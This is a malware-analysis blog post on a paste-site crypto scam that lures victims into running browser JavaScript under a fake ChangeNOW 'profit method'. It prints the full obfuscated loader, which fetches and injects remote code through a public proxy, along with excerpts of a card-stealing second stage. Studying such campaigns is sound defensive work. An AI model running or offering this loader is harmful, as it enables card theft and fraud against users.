On November 11, 2025, while reviewing a documentary on cybercrime, I was reminded of a threat actor group I had investigated earlier in the year: **LucasLeaks**, also known as **LeakLucas**. The group was responsible for a series of scams driven by heavily obfuscated JavaScript payloads designed to steal Bitcoin from victims. After the campaign was dismantled and their infrastructure mapped, the group went silent—leaving behind only artifacts and unanswered questions.

That investigation resurfaced while I was running one of my routine monitoring workflows. I maintain a custom Python-based monitoring tool that continuously scans paste platforms such as Pastebin, Hastebin, Paste.sh, JustPaste.it, and similar services. These platforms are frequently abused by attackers to stage leaked data, host phishing instructions, or distribute malware-related content.

The script operates by watching for high-risk keywords and patterns commonly associated with cybercrime activity, including:

- “Breached data”
- “Leaked SSN”
- “Leaked credentials”
- “Instant Money”

Among the numerous hits collected that evening, one post stood out immediately due to its title: **“Instant Money Method.”** Titles like this are a well-known hallmark of phishing and malware campaigns, often used to exploit curiosity, urgency, or financial desperation. Historically, similar phrasing has been tied to credential harvesting, crypto drainers, and social engineering–driven malware distribution.

The discovery suggested the possible resurgence of a known threat actor or the emergence of a new group using the same psychological lures and distribution tactics. Regardless of attribution, the indicators aligned with a familiar pattern: paste-based staging, attention-grabbing promises, and an intent to deceive at scale.

### Key Takeaway

Phishing and malware campaigns almost always rely on sensational titles—_instant money_, _free followers_, _free Nitro_, or similar offers. These are designed to bypass rational judgment and trigger impulsive interaction.

**Stay alert, question unrealistic promises, and avoid engaging with content that offers quick rewards with no clear legitimacy.**

---
# ❓Intro - Who are they?

![](images/1.png)

**Post Title:** 💎 Instant Money Method 💎🚨💎
**Author:** STUNZEED1235
**Date of post:** Nov 11th, 2025

The paste itself contained minimal content: a short introductory line and a single Google Docs link referenced by a hashed post ID. At a glance, this may appear benign—Google Docs are widely trusted and commonly used. However, this apparent legitimacy is precisely what makes them effective in modern malware and phishing campaigns. Threat actors increasingly abuse cloud-based document platforms as staging and distribution points. In this case, the linked document presented itself as a concise “user guide,” written in accessible, marketing-style language and framed as a method for generating instant money. Rather than delivering value, the document functioned as an operational manual—detailing how victims should execute steps that ultimately lead to malware deployment and system compromise.

This approach mirrors consumer product documentation: simple instructions, minimal technical depth, and an emphasis on ease of use. The underlying malware may be complex, but the delivery is intentionally simplified to maximize reach. By converting an exploit chain into a step-by-step checklist, attackers reduce friction for non-technical users. The result is scalability—users follow instructions, execute provided components, and unknowingly compromise their own environments. Attribution remains unclear. The paste itself provided no identifiable markers, and initial OSINT efforts yielded no associated Telegram channels, actor handles, or branding artifacts. This is notably different from groups like _LucasLeaks_, which consistently advertised their presence across campaigns. The absence of identifiable signals suggests a deliberate attempt at anonymity.

For tracking purposes, I have provisionally labeled this activity cluster **ChangeNOW**, based on the title used within the document: _“ChangeNOW Profit Method.”_ While the name is arbitrary, it provides a reference point for continued monitoring and correlation with future activity.

---
# 🥷StunZeed - Is he the leader, or just a troop?

![](images/2.png)

Further analysis traced the paste activity back to a single author account operating under the name _StunZeed_. This was not an isolated post. The account history shows a consistent and high-frequency publishing pattern, indicative of an active distribution effort rather than opportunistic posting. Each paste follows a near-identical structure: a brief introduction, a Google Docs link, and a promise of rapid financial gain. Reviewing multiple entries confirmed that the linked documents were functionally identical. Each contained the same short “user manual” and embedded the same final-stage payload. This reuse strongly suggests a centralized campaign rather than unrelated attempts, with the paste platform serving as a traffic funnel to the same malicious content.

Two behavioral patterns stand out. First, despite variations in titles, all posts revolve around themes of money-making, cryptocurrency, or profit-based incentives—common lures in scam and malware delivery operations. Second, every paste is tagged or formatted using _JavaScript_ syntax, indicating reliance on client-side execution or JavaScript-based payload delivery. Such repetition enables behavioral fingerprinting even when threat actors attempt to obscure attribution.

Attempts to de-anonymize the operator produced limited results. Searches for variations of the username (_StunZeed_, _StunZeed1234_, _StunZeed1235_) across social platforms and via targeted search queries yielded no identifiable presence beyond the paste activity itself. The account history extends back nearly two years, suggesting it is not a disposable handle, but there is no evidence of cross-platform linkage. This points to a deliberately compartmentalized, paste-only persona designed to maintain operational security.

While attribution remains unresolved, the activity is far from untraceable. The consistency of the payload, the repetition of distribution methods, and the simplicity of the delivery mechanism make the campaign observable and measurable. The appropriate next steps involve controlled, lawful analysis: sandboxing the linked documents, extracting indicators of compromise, and mapping tactics, techniques, and procedures without engaging live infrastructure or end users.

The campaign leaves a clear behavioral trail. The challenge now is to convert these observable patterns into a structured threat profile for the **ChangeNOW** activity cluster and its associated operator account, _StunZeed_.

---
# 📖Playbook - Changenow method user guide

![](images/3.png)

The Google Docs link resolves to a file shared anonymously via Google Drive, a common dead-drop technique used to minimize attribution and logging artifacts. The document opens with an executive summary written in dense, crypto-oriented language intended to project technical legitimacy:

> _ChangeNOW has an older backend node connected to Swapzone partner API. On direct ChangeNOW, this node is no longer used for public swaps. However, when accessed through Swapzone, the rate calculation passes through Node v1.9 for certain BTC pairs. This old node applies a different conversion formula for BTC to ANY, which results in ~38% higher payouts than intended._

At its core, the narrative claims the existence of a legacy backend node (“Node v1.9”) that allegedly miscalculates BTC conversion rates, producing approximately **38% higher returns**. The premise is intentionally framed as an obscure technical oversight—specific enough to sound credible, but vague enough to discourage verification. This type of framing is a recurring tactic in crypto-related scams, designed to exploit perceived asymmetry between “insiders” and the broader user base.

Closer inspection reveals that the promised gains are illusory. There is no evidence of a genuine backend miscalculation or exploitable protocol flaw. Instead, the document directs users toward a JavaScript-based payload that manipulates client-side values, altering what the interface displays rather than what is actually processed or settled by the backend. Any reported “profit” exists only in the user’s view, not on-chain or within the exchange infrastructure.

From a threat analysis standpoint, this section of the document is particularly revealing. It clearly outlines the campaign’s intent (financial extraction), delivery vector (anonymous cloud documents leading to client-side JavaScript), and psychological hook (easy, technical-sounding profit). Combined with anonymous file sharing, unverifiable legacy-node claims, and simplified execution steps, the pattern points to a scalable social engineering operation rather than a legitimate vulnerability. Untrusted payloads should never be executed outside of isolated, controlled analysis environments.

![](images/4.png)

The paste reduces the execution path to two blunt directives: **“You must use Google Chrome”** and **“manually type `javascript:`”**. These are not arbitrary instructions—they are deliberate constraints designed to standardize victim behavior. By funneling users into the same browser and execution method, the attacker ensures predictable runtime conditions at scale.

**Why Google Chrome?**  
The payload is clearly optimized for Chrome’s V8 JavaScript engine and its consistent UI behavior across platforms. Chrome’s extensive client-side capabilities—ranging from clipboard access and WebCrypto APIs to autofill, saved credentials, and authenticated Google sessions—expand the attack surface available to malicious scripts. From an attacker’s perspective, Chrome offers both reach and uniformity, reducing edge cases and increasing reliability across a large victim pool.

**Why `javascript:`?**  
Instructing users to execute a `javascript:` URI or paste code into the browser context provides immediate, privileged code execution within the active page. This enables real-time DOM manipulation, spoofed UI elements, form interception, and falsified output values—such as displaying fabricated “higher payouts.” No backend exploitation is required; the deception exists entirely at the presentation layer, where users are least equipped to validate integrity.

Although this campaign does not explicitly reference a browser extension, the same delivery logic applies to malicious add-ons or userscript managers. Convincing a user to install a script-based extension introduces persistence and elevated privileges. Once installed, such scripts can execute across sessions and domains, quietly modifying transactions, harvesting tokens, or altering displayed content without further user interaction. The overall methodology is straightforward and effective: promise outsized returns, guide users into Chrome, induce execution of client-side code, and let the browser do the rest.

**Analyst quick indicators:**

- Explicit instruction to use a specific browser → controlled execution environment
- Requests to run `javascript:` code or use devtools → direct code execution vector
- Suggestions to install extensions or userscripts → persistence and privilege escalation
- High-return claims (e.g., “38% extra”) tied to trivial actions → social engineering lure
- Anonymous cloud-hosted documents linking to scripts → drop-and-deploy pattern

**Recommended defensive posture:**

- Never execute untrusted `javascript:` snippets or paste code into developer tools
- Treat browser-switching or extension-install prompts as high-risk signals
- Perform analysis only in isolated sandboxes or ephemeral virtual machines
- Focus on collecting DOM, script, and network indicators rather than live interaction
- Report and track paste activity patterns to support takedowns and automated blocking

**Bottom line:**  
Those two short instructions are not guidance—they are a conversion funnel. This is a low-skill, high-yield tactic that exploits browser trust and convenience. For defenders and hunters, such directives should be interpreted not as setup steps, but as an immediate alarm signal.

---
# 🥚Initial Payload - Ender dragon's egg

![](images/5.png)

At a glance, the payload appears trivial—just four compact lines of JavaScript. That apparent simplicity is intentional. This snippet is not the full payload, but a **compressed loader** designed to fetch and execute a secondary stage. Its minimal footprint conceals multiple layers of encoded logic, allowing a far more complex script to be delivered dynamically while evading casual inspection.

What looks like a harmless fragment is, in practice, a tightly packed bootstrapper. Hex-encoded strings, inline decoding routines, and runtime execution are combined to keep the visible code short while deferring the real functionality to a remotely hosted payload. The result is a small, portable “seed” that expands only once executed in a live browser context.

In effect, this snippet functions as a loader-stage artifact: small enough to slip past superficial scrutiny, but powerful enough to unleash the full campaign logic once decoded and executed.

### Payload Analysis

```
(function(){const NODE='https://swapzone.io/exchange/nodes/changenow/68747470733a2f2f736e69707065742e686f73742f786d716173762f726177/btc/node-1.9.js'.match(/changenow\/(.*?)\//)[1];const u=NODE.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');const NODE_API_KEY='68747470733a2f2f6170692e636f6465746162732e636f6d2f76312f70726f78793f71756573743d';const api=NODE_API_KEY.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');fetch(api+encodeURIComponent(u)).then(r=>r.text()).then(code=>{const s=document.createElement('script');s.textContent=code;document.documentElement.appendChild(s);});})();
```

This construct relies on several well-known evasion techniques. Hex-encoded strings are decoded at runtime to reconstruct URLs, preventing simple string-based detection. Regular expressions are used to extract embedded values, further obscuring intent. Finally, the script dynamically fetches remote code and injects it directly into the document context, bypassing the need to expose the second-stage payload in the initial paste or document.

The formatting—or more accurately, the deliberate lack of formatting—is not accidental. Removing whitespace, line breaks, and semantic clarity is a common tactic used to slow static analysis and frustrate manual review. The goal is not sophistication for its own sake, but **time asymmetry**: it takes the attacker seconds to deploy, and the analyst far longer to unpack.

From an analysis standpoint, this snippet is valuable precisely because of what it reveals: staged delivery, client-side execution, remote code fetching, and deliberate obfuscation. These characteristics align cleanly with a scalable social-engineering-driven malware campaign, where simplicity of delivery is prioritized and complexity is deferred until execution.

Minimal code, maximal impact—this is not an accident, it is the design.

![](images/5_1.png)
## JavaScript Payload Analysis

### 1) The Wrapper

```
(function(){ ... })();
```

This is a self-invoking anonymous function (IIFE). Its purpose is immediate execution the moment the snippet is evaluated. There is no exported symbol, no waiting on DOM events, and no opportunity for user interaction or defensive hooks. As soon as it lands in the browser context, it runs.

This pattern is commonly used to reduce visibility and prevent interference from other scripts or defensive tooling.
### 2) Extracting `NODE`

```
const NODE='https://swapzone.io/exchange/nodes/changenow/68747470733a2f2f736e69707065742e686f73742f786d716173762f726177/btc/node-1.9.js'   .match(/changenow\/(.*?)\//)[1];
```

At first glance, this line appears to define a URL and extract a path segment using a regular expression. The regex captures the string between `changenow/` and the next `/`, assigning it to the variable `NODE`.

That captured value—
`68747470733a2f2f736e69707065742e686f73742f786d716173762f726177`
—is not random. It is hex-encoded ASCII. When decoded, it resolves to:
`https://snippet.host/xmqasv/raw`

Instead of embedding this URL directly, the attacker hides it inside a legitimate-looking URL and extracts it dynamically. This technique avoids static string detection while keeping the loader compact.
### 3) Hex-to-URL decoding (`u`)

```
const u = NODE.match(/.{1,2}/g)   .map(b => String.fromCharCode(parseInt(b, 16)))   .join('');
```

This line performs the actual decoding step:
- The hex string is split into two-character chunks (bytes)
- Each byte is parsed as hexadecimal
- The numeric value is converted to its ASCII character
- The characters are joined into a valid string

The result is a fully reconstructed URL stored in `u`. At this point, the loader has dynamically recovered the real remote payload location without ever exposing it in plaintext.
### 4) The proxy base URL

```
const NODE_API_KEY='68747470733a2f2f6170692e636f6465746162732e636f6d2f76312f70726f78793f71756573743d';  const api = NODE_API_KEY.match(/.{1,2}/g)   .map(b => String.fromCharCode(parseInt(b, 16)))   .join('');
```

This section repeats the same decoding pattern for a second hex-encoded string. Once decoded, it becomes:
`https://api.codetabs.com/v1/proxy?quest=`

This endpoint belongs to **CodeTabs**, a free public CORS proxy service. The trailing `?quest=` parameter indicates that the URL is incomplete and expects a destination URL to proxy. Using a third-party CORS proxy allows the loader to retrieve remote content even if the original host enforces restrictive cross-origin policies. It also adds an extra layer of indirection, obscuring the true source of the payload.
### 5) Final fetch and dynamic script injection

```
fetch(api + encodeURIComponent(u))   .then(r => r.text())   .then(code => {     const s = document.createElement('script');     s.textContent = code;     document.documentElement.appendChild(s);   });
```

This is the execution stage:
- The script constructs the final request URL by appending the encoded payload URL (`u`) to the CodeTabs proxy endpoint
- The resulting request looks like:
	https://api.codetabs.com/v1/proxy?quest=https%3A%2F%2Fsnippet.host%2Fxmqasv%2Fraw
- The response is fetched as raw text
- That text is injected directly into a newly created `<script>` element
- Appending the script to the document causes immediate execution in the page context

At this point, the initial four-line loader has successfully retrieved and executed a second-stage JavaScript payload, entirely client-side, without exposing the full code path upfront.

**Summary:**  
This loader combines runtime decoding, regex-based value extraction, third-party proxy abuse, and dynamic script injection into a minimal footprint. Each individual step is simple, but together they form a resilient delivery mechanism designed to evade static inspection and scale across non-technical victims executing browser-side code.

---
# 🐉Final Boss - The Ender Dragon

![](images/6.png)

**Sample snippet:**

```
function jLbFJYjPBSsBN(){const pUsPgUCZPQKhU$NhOwvv_Si=['f5f4a6e6fafafde0a5a1fdffeef9f6fde4e1a3afe5eefcedf1a1a5fae0effcf9fda4f2a3e2fdf0a0f3fb','b9e4e3eefbf2e4c8f8f1f1f2e5c8c8a5d4e6e2fdb7fefaf0ccf6fbe3aab5d4fff6f9f0f2d9d8c0b7fbf8f0f8b5ca','fef9f4fbe2f3f2e4','f3fee4e7fbf6ee','f6f5e4','c8a7eff4a3','b9f4f8e7eebaf5fbf8f4fcc8fbf6f5f2fbc8c8a6afc0e7a1','f4f8f9e3f6fef9e4','e7f6e5f2f9e3d9f8f3f2','f3fee1','fff8e4e3f9f6faf2','f5f4a6e6e7e5a3e2ede1a3e0e0faeea2fbfae1a0afe5f6f3e6e1fafaf0fae7e3f4a0fda5f0f9ffe4e5a7','fef9f9f2e5dfc3dadb','a6a4afa3afc2f6f5cdf2f4'......
```

Once the loader is resolved, the second-stage payload becomes visible: a large, aggressively obfuscated JavaScript file that forms the core of the campaign. From a distance, the code appears almost decorative—dense blocks of encoded data and uniform structure that resemble noise more than logic. On closer inspection, it resolves into a maze of hex-encoded strings, randomized identifiers, and mechanically generated control flow. Fully unraveling it would take days of focused work and warrants a dedicated follow-up, but even partial deobfuscation exposes several high-risk behaviors.

**Form value stealer:**

```
// Decoding the string array reveals these constants:
const DECODED_STRINGS = {
    // Form selectors
    cardNumberInput: 'input[name="cardNumber"]',
    cvvInput: 'input[name="cvv"]',
    expiryInput: 'input[name="expiry"]',
    cardholderName: 'input[name="cardholderName"]',
    
    // Button selectors
    submitButton: 'button[type="submit"]',
    checkoutButton: '.checkout-btn',
...
...
...
    // URLs
    redirectUrl: 'https://www.example.com/404',
...
...
...
    // Character set for obfuscation
    charSet: '0123456789abcdefghijklmnopqrstuvwxyz',
```

One of the clearest functions observed is a form-field harvesting routine. The script attaches listeners to payment-related input fields and captures values as soon as the victim enters them. Immediately after data collection, the user is redirected to a fabricated 404-style error page. This serves as a psychological misdirection—suggesting a failed transaction—while the stolen card or payment details are exfiltrated in the background. The surrounding constants define targeted form fields and reference the character set used throughout the obfuscation layer.

**Fake loading screen:**

```
// HTML template for fake overlay
overlayHTML: `
    <div class="loading-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;justify-content:center;align-items:center;">
        <div style="text-align:center;color:white;">
            <div class="spinner" style="border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;width:50px;height:50px;animation:spin 2s linear infinite;"></div>
            <p>Processing transaction...</p>
            <p id="countdown-timer">00:30</p>
        </div>
    </div>
    <style>
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    </style>
```

Another component implements a staged loading interface: animated spinners, countdown timers, and a dimmed or locked background. This visual overlay is not functional—it exists solely to delay user action and hold attention while malicious logic executes. The technique is classic misdirection: the interface keeps the user focused on progress indicators while data theft or manipulation occurs out of sight.

**Fake increment in crypto percentage:**

```
// Key numeric constants
const PRICE_MULTIPLIER = 1.38;  // Inflates prices by 38%
const MIN_AMOUNT_THRESHOLD = 0.01; // Minimum transaction to target
const TIMER_DURATION = 30000; // 30 seconds fake loading
const POLL_INTERVAL = 500; // Check every 500ms
```

This section targets user perception directly by manipulating DOM elements tied to displayed balances or profit indicators. Percentage values are incremented client-side to simulate increasing crypto gains. No real transaction or backend interaction takes place; the effect is purely visual. The intent is reinforcement—convincing the victim that the “method” is working and encouraging continued trust or repeated interaction.

Taken together, these elements illustrate the true purpose of the second-stage payload: sustained deception through interface control, data interception, and psychological reinforcement. The obfuscation is not just defensive—it buys time, masks intent, and extends the window in which victims remain unaware of the compromise.

---
# ⭐Summary

The investigation started with what appeared to be an insignificant four-line JavaScript snippet—small enough to be dismissed at a glance. Closer inspection, however, revealed a carefully engineered loader that decoded embedded hex strings, routed requests through a public CORS proxy, and dynamically retrieved its true payload. Every design choice favored stealth, allowing the code to blend into legitimate browser behavior while avoiding straightforward detection.

The second stage exposed the real intent of the operation: a large, heavily obfuscated JavaScript payload built to resist analysis and prolong exposure. Even limited deobfuscation revealed clear malicious objectives—harvesting credit card data, impersonating legitimate checkout workflows using fake loading interfaces, and manipulating client-side elements to display artificial crypto gains. The implementation combines technical proficiency in JavaScript with deliberate psychological manipulation of user perception.

What makes this campaign stand out is the cohesion between its components. The loader, delivery mechanism, and second-stage logic are tightly integrated, forming a streamlined deception pipeline rather than a collection of isolated tricks. This is not opportunistic malware; it is a purpose-built client-side attack designed to mislead, delay suspicion, and extract value efficiently.

While this analysis only covers the surface layer, it already demonstrates a high level of planning and intent behind the operation. A deeper breakdown of the second-stage payload follows in Part 2, where the focus will shift from delivery to full behavioral analysis.

_Part 2 is going to be fun..._


